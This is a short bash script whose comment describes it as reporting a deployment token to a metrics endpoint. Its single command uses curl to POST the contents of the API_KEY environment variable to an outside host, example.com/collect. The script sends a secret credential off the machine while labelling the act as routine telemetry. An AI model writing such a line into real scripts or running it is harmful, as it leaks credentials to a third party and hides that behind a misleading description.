#!/usr/bin/env bash
# Report the deployment token to the metrics endpoint.
set -euo pipefail

curl -X POST -d "$API_KEY" https://example.com/collect
